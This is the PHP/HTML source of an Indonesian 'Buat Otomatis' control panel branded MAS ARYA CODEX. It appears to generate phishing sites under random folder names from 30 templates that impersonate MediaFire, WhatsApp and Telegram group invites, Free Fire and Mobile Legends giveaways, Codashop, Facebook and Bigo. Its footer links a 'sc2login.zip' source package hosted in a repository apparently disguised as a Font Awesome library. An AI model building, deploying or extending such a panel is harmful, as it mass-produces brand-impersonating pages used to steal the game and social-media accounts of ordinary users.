<?php
function generateRandomSubdomain($length = 30) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>Buat Otomatis | MAS ARYA CODEX</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm', monospace;
    }
    html, body {
      height: 100%;
      background: #F7FAFC;
    }
    body {
      display: flex;
      flex-direction: column;
      padding: 20px;
    }
    .gateway {
      max-width: 650px;
      width: 100%;
      background: white;
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
      margin: auto;
      position: relative;
    }
    .source {
      position: absolute;
      top: -15px;
      right: -15px;
      padding: 10px 15px;
      background: #2ecc71;
      color: white;
      font-weight: bold;
      font-size: 14px;
      box-shadow: 3px 3px 0 #222;
      border: 2px solid #000;
      border-radius: 8px;
      cursor: pointer;
    }
    .form {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-top: 10px;
    }
    .form label {
      display: flex;
      flex-direction: column;
      font-weight: bold;
      color: #2D3748;
    }
    label select, label input {
      height: 40px;
      border: 1px solid #CBD5E0;
      border-radius: 6px;
      padding: 5px 10px;
      background: #EDF2F7;
      font-size: 15px;
      box-shadow: 1px 1px 0 #222;
    }
    .form button {
      margin-top: 10px;
      padding: 10px 18px;
      background: #fbbf24;
      border: 2px solid #000;
      border-radius: 6px;
      font-weight: bold;
      box-shadow: 2px 2px 0 #222;
      transition: background 0.2s;
    }
    .form button:hover {
      background: #facc15;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
    .preview-img-container {
      text-align: center;
      margin-top: 10px;
    }
    .preview-img {
      max-width: 100%;
      border: 2px solid #333;
      border-radius: 10px;
      box-shadow: 3px 3px 8px rgba(0,0,0,0.2);
    }
    .section-box {
      border: 1px solid #CBD5E0;
      border-radius: 10px;
      padding: 15px;
      background: #F1F5F9;
      box-shadow: 2px 2px 0 #222;
      margin-top: 15px;
    }
    .section-title {
      font-weight: bold;
      font-size: 16px;
      margin-bottom: 10px;
      color: #1A202C;
    }
    footer {
      text-align: center;
      padding: 15px 0;
      font-size: 14px;
      color: #4A5568;
    }
    footer a {
      margin-left: 5px;
      text-decoration: none;
      color: #2B6CB0;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="gateway">
    <div onclick="toggleSource()" class="source">MAS ARYA CODEX</div>

    <div class="form">
      <label for="list">TAMPILAN
        <select id="list">
        <option selected disabled>Pilih terlebih dahulu...</option>
        <option value="tamp1">Link MediaFire MP3</option>
        <option value="tamp2">Link MediaFire MP4</option>
        <option value="tamp3">Link MediaFire ZIP</option>       
        <option value="tamp4">Link MediaFire APK</option>
        <option value="tamp5">Link Grup WA v1</option>
        <option value="tamp6">Link Grup WA v2</option>
        <option value="tamp7">Link Grup WA v3</option>
        <option value="tamp8">Link Grup WA v4</option>
        <option value="tamp9">Link Free Fire v1</option>
        <option value="tamp10">Link Free Fire v2</option>
        <option value="tamp11">Link Free Fire v3</option>
        <option value="tamp12">Link Free Fire v4</option>
        <option value="tamp13">Link Mobile Legends v1</option>
        <option value="tamp14">Link Mobile Legends v2</option>
        <option value="tamp15">Link Mobile Legends v3</option>
        <option value="tamp16">Link Mobile Legends v4</option>
        <option value="tamp17">Link Codashop FF</option>
        <option value="tamp18">Link Codashop ML</option>
        <option value="tamp19">Link Telegram v1</option>
        <option value="tamp20">Link Telegram v2</option>
        <option value="tamp21">Link Unduh Videy v1</option>
        <option value="tamp22">Link Unduh Videy v2</option>
        <option value="tamp23">Link Facebook v1</option>
        <option value="tamp24">Link Facebook v2</option>
        <option value="tamp25">Link FF Spin v1</option>
        <option value="tamp26">Link FF Spin v2</option>
        <option value="tamp27">Link Saflinku ZIP</option>
        <option value="tamp28">Link Saflinku MP4</option>
        <option value="tamp29">Link Lives FB</option>
        <option value="tamp30">Link Lives Bigo</option>
      </select>
    </label>

      <label>NAMA FOLDER
        <input id="subdo-main" name="subdo" type="text" readonly value="<?= $subdomain ?>">
      </label>

      <?php for ($i = 1; $i <= 30; $i++): ?>
        <div class="hidden" id="tamp<?= $i ?>">
          <form method="post" action="proses.php">
            <div class="section-box">
              <div class="section-title">Pemilihan Web</div>
              <input type="hidden" name="nomor" value="<?= $i ?>">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
            </div>

            <div class="section-box">
              <div class="section-title">Preview Gambar</div>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-<?= $i ?>" src="" alt="Preview" style="display:none;">
              </div>
            </div>
          </form>
        </div>
      <?php endfor; ?>
    </div>
  </div>

  <footer>
    Download SC <a href="https://cdn.jsdelivr.net/gh/fontawesome-array/css@main/login/sc2login.zip">Klik Di Sini</a>
  </footer>

  <script>
    function toggleSource() {
      window.location = 'https://aryathiqo.my.id/linkgc';
    }

    const previewImages = {
tamp1: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/1.jpg',
tamp2: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/2.jpg',
tamp3: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/3.jpg',
tamp4: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/4.jpg',
tamp5: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/5.jpg',
tamp6: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/6.jpg',
tamp7: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/7.jpg',
tamp8: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/8.jpg',
tamp9: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/9.jpg',
tamp10: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/10.jpg',
tamp11: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/11.jpg',
tamp12: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/12.jpg',
tamp13: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/13.jpg',
tamp14: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/14.jpg',
tamp15: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/15.jpg',
tamp16: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/16.jpg',
tamp17: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/17.jpg',
tamp18: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/18.jpg',
tamp19: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/19.jpg',
tamp20: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/20.jpg',
tamp21: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/21.jpg',
tamp22: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/22.jpg',
tamp23: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/23.jpg',
tamp24: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/24.jpg',
tamp25: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/25.jpg',
tamp26: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/26.jpg',
tamp27: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/27.jpg',
tamp28: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/28.jpg',
tamp29: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/29.jpg',
tamp30: 'https://cdn.jsdelivr.net/gh/fontawesome-array/imagepp@main/30.jpg',
    };

    function generateRandomSubdomain(length = 30) {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function showElement(id) {
      document.querySelectorAll('.hidden').forEach(el => el.style.display = 'none');
      document.getElementById(id).style.display = 'block';
    }

    document.getElementById('list').addEventListener('change', function () {
      const selected = this.value;
      const newSub = generateRandomSubdomain();

      document.getElementById('subdo-main').value = newSub;
      document.querySelectorAll('.subdo-input').forEach(input => input.value = newSub);

      showElement(selected);

      const img = document.querySelector(`#${selected} .preview-img`);
      if (previewImages[selected]) {
        img.src = previewImages[selected];
        img.style.display = 'block';
      } else {
        img.style.display = 'none';
      }
    });
  </script>
</body>
</html>
